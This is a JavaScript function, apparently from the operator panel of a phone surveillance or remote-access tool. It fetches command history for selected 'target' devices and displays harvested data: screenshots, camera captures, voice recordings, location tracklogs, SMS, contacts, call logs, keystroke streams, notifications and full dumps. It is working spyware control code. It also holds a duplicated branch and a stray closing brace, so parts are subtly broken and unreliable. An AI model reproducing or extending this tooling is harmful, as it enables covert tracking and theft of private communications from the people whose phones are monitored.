ops.find_block:
async function auditCmd(type) {
    if (selectedDeviceIds.size === 0) return toast("SELECT TARGETS TO AUDIT", "danger");

    document.getElementById('status-title').innerText = `CLUSTER AUDIT: ${type}`;
    document.getElementById('status-content').innerHTML = '<div style="padding:20px; text-align:center;">FETCHING CLUSTER DATA...</div>';
    document.getElementById('status-overlay').style.display = 'flex';

    let statHistory = [];
    if (type === 'FORCE_UPLOAD') {
        const { data: sData } = await sb.from('device_stats')
            .select('*')
            .in('device_id', Array.from(selectedDeviceIds))
            .order('created_at', { ascending: true }); // Order ascending to find the 'first' match after cmd
        if (sData) statHistory = sData;
    }

    const { data: commands, error } = await sb.from('file_commands')
        .select('*')
        .eq('file_name', type)
        .in('device_id', Array.from(selectedDeviceIds))
        .order('created_at', { ascending: false })
        .limit(10);

    if (error) return document.getElementById('status-content').innerHTML = `Error: ${error.message}`;

    document.getElementById('status-content').innerHTML = commands.map(c => {
        let statusCol = 'var(--text)';
        if (c.status === 'PENDING') statusCol = '#f59e0b';
        if (c.status === 'RECEIVED') statusCol = 'var(--primary)';
        if (c.status === 'EXECUTED' || c.status.includes('SUCCESS')) statusCol = 'var(--success)';
        if (c.status.includes('FAILED') || c.status.includes('ERROR')) statusCol = 'var(--danger)';

        let dataHtml = "";
        if (type === 'GET_SCREENSHOT' || type === 'CAPTURE_IMAGE' || type === 'RECORD_VOICE' || c.result_file_path?.includes('PULL')) {
            dataHtml = `<div style="margin-top:10px; padding:10px; background:rgba(255,255,255,0.05); border:1px solid #555;">
                <div style="color:#fff; font-size:0.7rem; font-weight:bold;">📸 MEDIA_READY</div>
                <div style="font-size:0.75rem; color:#aaa; margin:5px 0;">${c.result_file_path ? c.result_file_path.split('/').pop() : 'Processing...'}</div>
                <div onclick="switchTab('files')" style="color:var(--primary); cursor:pointer; font-size:0.7rem; text-decoration:underline;">OPEN IN VAULT</div>
            </div>`;
        }

        if (type === 'FORCE_UPLOAD') {
            const modules = c.content.split(',').map(m => m.trim());
            dataHtml = `<div style="margin-top:10px; display:flex; flex-wrap:wrap; gap:5px; margin-bottom:8px;">` + 
                modules.map(m => `<span style="font-size:0.6rem; padding:2px 6px; background:rgba(0,255,157,0.1); color:var(--success); border:1px solid rgba(0,255,157,0.2);">${m.toUpperCase()}</span>`).join('') + 
                `</div>`;

            // Find the stat entry that was created closest to (and after) this specific command
            const s = statHistory.find(stat => 
                stat.device_id === c.device_id && 
                new Date(stat.created_at) >= new Date(c.created_at)
            );
            if (s) {
                dataHtml += `<div style="background:rgba(0,0,0,0.5); border:1px solid #333; margin-top:5px;">`;

                // Track which modules we've already displayed to avoid duplicates
                const displayedCols = new Set();

                // 1. Process Requested Modules
                modules.forEach((m, mIdx) => {
                    const mod = m.split(':')[0].toLowerCase();
                    let label = mod.toUpperCase();
                    let preview = "";
                    let fullData = null;

                    if (mod === 'location') {
                        displayedCols.add('location_history'); displayedCols.add('location_fresh'); displayedCols.add('location_status');
                        const loc = s.location_fresh || (s.location_history?.[0]);
                        if (loc) {
                            const mapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
                            preview = `<a href="${mapUrl}" target="_blank" style="color:var(--success); text-decoration:none; font-weight:bold;">📍 MAP LINK</a>`;
                        } else preview = "NO_SIGNAL";
                        const history = s.location_history || [];
                        fullData = s.location_fresh ? [s.location_fresh, ...history] : history;
                    } else if (mod === 'vitals') {
                        displayedCols.add('battery_level'); displayedCols.add('online_sessions'); displayedCols.add('online_time_minutes'); displayedCols.add('app_health'); displayedCols.add('summary_stats');
                        preview = `BATT: ${s.battery_level}% | SESSIONS: ${s.online_sessions}`;
                        fullData = { battery: s.battery_level, online_mins: s.online_time_minutes, summary: s.summary_stats, health: s.app_health };
                        const loc = s.location_fresh || (s.location_history?.[0]);
                        if (loc) {
                            const mapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
                            preview = `<a href="${mapUrl}" target="_blank" style="color:var(--success); text-decoration:none; font-weight:bold;">📍 MAP LINK</a>`;
                        } else preview = "NO_SIGNAL";
                        const history = s.location_history || [];
                        fullData = s.location_fresh ? [s.location_fresh, ...history] : history;
                    } else if (mod === 'vitals') {
                        preview = `BATT: ${s.battery_level}% | SESSIONS: ${s.online_sessions}`;
                        fullData = { battery: s.battery_level, online_mins: s.online_time_minutes, health: s.app_health };
                    } else if (mod === 'sms') { preview = (s.sms_logs?.length || 0) + " LOGS"; fullData = s.sms_logs; }
                    else if (mod === 'contacts') { preview = (s.contacts?.length || 0) + " ENTRIES"; fullData = s.contacts; }
                    else if (mod === 'apps') { preview = (s.apps?.length || 0) + " INSTALLED"; fullData = s.apps; }
                    else if (mod === 'calls') { preview = (s.calls?.length || 0) + " RECORDS"; fullData = s.calls; }
                    else if (mod === 'usage') { preview = (s.screen_time_minutes || 0) + " MINS"; fullData = s.app_usage_timeline; }
                    else if (mod === 'typing') { preview = (s.typing_history?.length || 0) + " KEY_STREAMS"; fullData = s.typing_history; }
                    else if (mod === 'notifications') { preview = (s.notif_history?.length || 0) + " ALERTS"; fullData = s.notif_history; }
                    else if (mod === 'all') { preview = "COMPLETE_DUMP"; fullData = s; }

                    const divId = `audit-exp-${c.id}-${mIdx}`;
                    const hasData = fullData !== null;
                    displayedCols.add(mod === 'sms' ? 'sms_logs' : (mod === 'calls' ? 'calls' : (mod === 'apps' ? 'apps' : (mod === 'contacts' ? 'contacts' : mod))));

                    dataHtml += `
                        <div style="border-bottom:1px solid #222; padding:8px; cursor:${hasData ? 'pointer' : 'default'};" ${hasData ? `onclick="toggleAuditData('${divId}')"` : ''}>
                            <div style="display:flex; justify-content:space-between; align-items:center;">
                                <span style="font-size:0.6rem; color:#888;">${label}</span>
                                <div style="display:flex; align-items:center; gap:8px;">
                                    <span style="font-size:0.7rem; color:var(--primary);">${preview}</span>
                                    ${hasData ? `<span style="color:var(--primary); font-size:0.5rem; opacity:0.5;">▼</span>` : ''}
                                </div>
                            </div>
                            <div id="${divId}" style="display:none; margin-top:10px; max-height:300px; overflow:auto; background:#050505; padding:8px; border:1px solid #333; pointer-events: auto;" onclick="event.stopPropagation()">
                                ${mod === 'location' && Array.isArray(fullData) ? `
                                    <table style="width:100%; border-collapse:collapse; font-size:0.6rem; color:var(--success);">
                                        <tr style="border-bottom:1px solid #444; color:#888; text-align:left;">
                                            <th style="padding:4px;">TIME</th><th style="padding:4px;">COORD</th><th style="padding:4px; text-align:right;">ACC</th>
                                        </tr>
                                        ${fullData.map(l => `
                                            <tr style="border-bottom:1px solid #222;">
                                                <td style="padding:4px; white-space:nowrap;">${new Date(l.ts).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</td>
                                                <td style="padding:4px; font-family:monospace;">${l.lat.toFixed(5)}, ${l.lon.toFixed(5)}</td>
                                                <td style="padding:4px; text-align:right; color:#888;">±${Math.round(l.acc)}m</td>
                                            </tr>
                                        `).join('')}
                                    </table>
                                    <div style="margin-top:10px; font-size:0.55rem; color:#444; text-align:center;">END OF TRACKLOG</div>
                                ` : `<pre style="font-size:0.6rem; color:var(--success); margin:0; white-space:pre-wrap; font-family: 'Share Tech Mono', monospace;">${JSON.stringify(fullData, null, 2)}</pre>`}
                            </div>
                        </div>`;
                });

                // 2. Automated Heuristic Discovery (Sidecar Data)
                const forensics = ['summary_stats', 'app_health', 'fatal_crash_report', 'device_info', 'location_status', 'fetch_mode', 'network_logs'];
                forensics.forEach(col => {
                    if (s[col] && !displayedCols.has(col)) {
                        const divId = `audit-side-${c.id}-${col}`;
                        dataHtml += `
                            <div style="border-bottom:1px solid #222; padding:8px; background:rgba(112,0,255,0.05); cursor:pointer;" onclick="toggleAuditData('${divId}')">
                                <div style="display:flex; justify-content:space-between; align-items:center;">
                                    <span style="font-size:0.6rem; color:var(--secondary); font-weight:bold;">DISCOVERED: ${col.toUpperCase()}</span>
                                    <span style="color:var(--secondary); font-size:0.5rem;">▼</span>
                                </div>
                                <div id="${divId}" style="display:none; margin-top:10px; max-height:250px; overflow:auto; background:#000; padding:8px; border:1px solid var(--secondary); pointer-events: auto;" onclick="event.stopPropagation()">
                                    <pre style="font-size:0.6rem; color:var(--success); margin:0; white-space:pre-wrap;">${JSON.stringify(s[col], null, 2)}</pre>
                                </div>
                            </div>`;
                    }
                });
                dataHtml += `</div>`;
            }
            }
        }

        return `
            <div class="card" style="margin-bottom:15px; border-left-color: ${statusCol}">
                <div style="display:flex; justify-content:space-between; font-size:0.7rem; color:#666; margin-bottom:5px;">
                    <span>ID: ${c.device_id.substring(0,8)}...</span>
                    <span>${new Date(c.created_at).toLocaleString()}</span>
                </div>
                <div style="font-size:0.85rem; font-weight:bold; color:${statusCol}">${c.status}</div>
                <div style="font-size:0.75rem; color:#666; margin-top:5px; font-style:italic;">CMD: ${c.content.substring(0,40)}</div>
                ${dataHtml}
                ${c.error_log ? `<div style="color:var(--danger); font-size:0.7rem; margin-top:8px; border-top:1px solid #300; padding-top:5px;">ERR_LOG: ${c.error_log}</div>` : ''}
            </div>
        `;
    }).join('') || '<div style="padding:40px; text-align:center; color:#444;">NO COMMAND HISTORY</div>';
}

